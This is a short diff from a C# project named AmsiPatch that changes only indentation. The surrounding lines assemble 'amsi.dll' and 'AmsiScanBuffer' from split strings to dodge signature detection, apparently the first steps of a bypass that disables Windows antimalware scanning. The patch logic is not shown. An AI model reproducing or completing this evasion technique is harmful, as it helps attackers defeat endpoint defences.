@@ -16,14 +16,14 @@ namespace AmsiPatch
             client.Dispose();
 
             string part1 = "am";
-	          string part2 = "si";
+	    string part2 = "si";
             string part3 = ".dll";
-	          string tot = part1 + part2 + part3;
+	    string tot = part1 + part2 + part3;
             var amsiDLL = LoadLibrary(tot);
             
 
             string sbpart1 = "Am";
-	          string sbpart2 = "siSca";
+	    string sbpart2 = "siSca";
             string sbpart3 = "nBuf";
             string sbpart4 = "fer";
             var amsilel = sbpart1 + sbpart2 + sbpart3 + sbpart4;
